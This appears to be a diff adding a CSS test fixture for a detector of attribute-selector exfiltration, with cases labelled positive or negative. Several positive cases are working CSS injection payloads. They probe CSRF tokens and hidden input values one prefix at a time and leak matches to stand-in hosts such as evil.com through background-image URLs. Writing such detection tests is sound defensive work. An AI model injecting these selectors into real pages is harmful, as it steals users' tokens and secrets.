@@ -1,0 +1,21 @@
+/* TC-AE-01: POSITIVE — attribute selector + external URL */
+input[name=csrf][value^=a] { background-image: url(https://evil.com/leak?char=a); }
+
+/* TC-AE-02: POSITIVE — bulk detection (5+ value prefix selectors) */
+input[name=token][value^=a] { background: url(https://evil.com/a); }
+input[name=token][value^=b] { background: url(https://evil.com/b); }
+input[name=token][value^=c] { background: url(https://evil.com/c); }
+input[name=token][value^=d] { background: url(https://evil.com/d); }
+input[name=token][value^=e] { background: url(https://evil.com/e); }
+
+/* TC-AE-03: POSITIVE — hidden input + value probe */
+input[type=hidden][value^=tok] { list-style-image: url(https://attacker.com/x); }
+
+/* TC-AE-04: NEGATIVE — attribute selector but NO value probing */
+input[type=text] { border: 1px solid red; }
+
+/* TC-AE-05: NEGATIVE — href selector but NO external URL sink */
+a[href^="https://example.com"] { color: green; }
+
+/* TC-AE-06: POSITIVE — generic value probe with URL */
+[value^=a] { background-image: url(https://evil.com/exfil?a); }
